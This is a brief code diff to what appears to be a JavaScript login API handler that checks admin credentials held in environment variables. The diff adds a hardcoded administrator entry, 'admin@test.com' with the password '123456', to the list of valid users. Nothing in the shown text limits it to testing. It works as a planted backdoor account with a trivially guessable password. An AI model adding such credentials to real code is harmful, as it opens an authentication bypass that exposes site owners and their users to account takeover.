@@ -1,3 +1,4 @@
+//login.js
 export default function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
 
@@ -5,7 +6,8 @@ export default function handler(req, res) {
 
   const validUsers = [
     { email: process.env.ADMIN_EMAIL_1, password: process.env.ADMIN_PASSWORD_1 },
-    { email: process.env.ADMIN_EMAIL_2, password: process.env.ADMIN_PASSWORD_2 }
+    { email: process.env.ADMIN_EMAIL_2, password: process.env.ADMIN_PASSWORD_2 },
+    { email: "admin@test.com", password: "123456" },
   ];
 
   const isValid = validUsers.some(
